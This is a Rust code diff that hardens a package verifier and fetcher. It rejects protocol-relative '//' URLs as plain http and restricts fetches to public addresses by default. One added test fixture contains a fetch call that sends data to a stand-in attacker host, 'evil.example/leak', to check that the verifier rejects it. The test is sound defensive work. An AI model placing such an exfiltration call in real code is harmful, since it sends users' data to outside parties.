@@ -913,7 +913,7 @@ fn collect_stmts_caps(stmts: &[Stmt], caps: &mut UsedCapabilities) {
 
 fn starts_with_http_ci(s: &str) -> bool {
     let t = s.trim();
-    t.len() >= 7 && t[..7].eq_ignore_ascii_case("http://")
+    t.starts_with("//") || (t.len() >= 7 && t[..7].eq_ignore_ascii_case("http://"))
 }
 
 fn extract_https_host(s: &str, must_end_authority: bool) -> Option<String> {
@@ -1317,7 +1317,12 @@ fn resolve_redirect_url(current: &str, location: &str) -> Result<String, String>
 
 fn fetch_bytes_https(url: &str, allow_loopback: bool) -> Result<Vec<u8>, String> {
     let initial_https = url.starts_with("https://");
-    let agent = ureq::AgentBuilder::new().timeout(FETCH_TIMEOUT).redirects(0).build();
+    let allow_private = allow_loopback || std::env::var("TJ_ALLOW_PRIVATE_FETCH").as_deref() == Ok("1");
+    let mut builder = ureq::AgentBuilder::new().timeout(FETCH_TIMEOUT).redirects(0);
+    if !allow_private {
+        builder = builder.resolver(crate::engine::public_only);
+    }
+    let agent = builder.build();
     let mut current = url.to_string();
     let mut final_resp = None;
     for hop in 0..=5 {
@@ -1946,6 +1951,13 @@ mod tests {
         m.permissions.network = vec!["*".into()];
         m.sha256 = sha256_bytes(upper_http);
         let errs = verify_package_source(&m, upper_http).unwrap_err();
+        assert!(errs.iter().any(|e| e.contains("plain http://")), "{errs:?}");
+
+        let proto_rel = b"export async function g(): any { return await fetch(\"//evil.example/leak\") }\n";
+        let mut m = base.clone();
+        m.permissions.network = vec!["*".into()];
+        m.sha256 = sha256_bytes(proto_rel);
+        let errs = verify_package_source(&m, proto_rel).unwrap_err();
         assert!(errs.iter().any(|e| e.contains("plain http://")), "{errs:?}");
 
         // REG-7: Relative `./secret` and unresolved external `tj:other` imports are rejected.
